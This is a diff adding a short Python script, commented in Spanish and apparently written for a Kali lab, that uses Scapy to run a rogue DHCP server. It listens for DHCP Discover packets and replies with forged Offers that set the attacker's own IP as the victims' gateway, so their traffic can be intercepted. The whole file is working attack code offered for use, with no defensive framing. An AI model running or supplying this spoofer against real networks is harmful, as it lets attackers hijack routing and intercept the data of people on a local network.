@@ -1,0 +1,43 @@
+from scapy.all import *
+
+# ==============================================================================
+# CONFIGURACIÓN DEL ATAQUE
+# ==============================================================================
+IFACE = "eth0"                   # Interfaz de Kali apuntando al Switch
+FAKE_SERVER_IP = "192.23.61.100"  # Tu propia IP de atacante
+FAKE_NETMASK = "255.255.255.0"
+FAKE_GATEWAY = "192.23.61.100"    # Nos ponemos como Gateway para interceptar datos
+FAKE_DNS = "8.8.8.8"
+OFFERED_IP = "192.23.61.222"       # IP falsa para la víctima
+# ==============================================================================
+
+def dhcp_spoofer(pkt):
+    # Detectar paquetes DHCPDiscover (Message Type = 1)
+    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
+        print(f"\n[+] DHCP Discover detectado desde MAC: {pkt[Ether].src}")
+        
+        xid = pkt[BOOTP].xid
+        print(f"[*] Generando DHCP Offer malicioso...")
+
+        # Construcción del paquete falsificado de capa 2 a capa 7
+        spoofed_offer = (
+            Ether(src=get_if_hwaddr(IFACE), dst="ff:ff:ff:ff:ff:ff") /
+            IP(src=FAKE_SERVER_IP, dst="255.255.255.255") /
+            UDP(sport=67, dport=68) /
+            BOOTP(op=2, yiaddr=OFFERED_IP, siaddr=FAKE_SERVER_IP, xid=xid, chaddr=pkt[BOOTP].chaddr) /
+            DHCP(options=[
+                ("message-type", "offer"),
+                ("server_id", FAKE_SERVER_IP),
+                ("subnet_mask", FAKE_NETMASK),
+                ("router", FAKE_GATEWAY),
+                ("name_server", FAKE_DNS),
+                ("lease_time", 43200),
+                "end"
+            ])
+        )
+        
+        sendp(spoofed_offer, iface=IFACE, verbose=False)
+        print(f"[v] ¡DHCP Offer falso enviado exitosamente!")
+
+print(f"[*] Escuchando peticiones DHCP en [{IFACE}]...")
+sniff(iface=IFACE, filter="udp and (port 67 or port 68)", prn=dhcp_spoofer, store=0)
